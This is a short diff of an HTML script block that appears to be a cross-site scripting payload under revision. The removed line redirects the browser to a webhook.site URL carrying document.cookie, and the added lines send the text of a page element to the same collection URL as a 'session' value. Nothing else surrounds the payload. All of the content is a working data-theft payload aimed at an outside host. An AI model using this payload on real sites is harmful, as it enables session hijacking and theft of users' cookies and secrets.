@@ -1,3 +1,5 @@
 <script>
-location.href = "https://webhook.site/8b332791-aba0-47be-97e3-31b90340bbf2/?cookie=" + document.cookie;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://webhook.site/8b332791-aba0-47be-97e3-31b90340bbf2/?session='+document.evaluate('/html/body/b', document, null, XPathResult.ANY_TYPE, null).iterateNext().textContent);
+  xhr.send()
 </script>
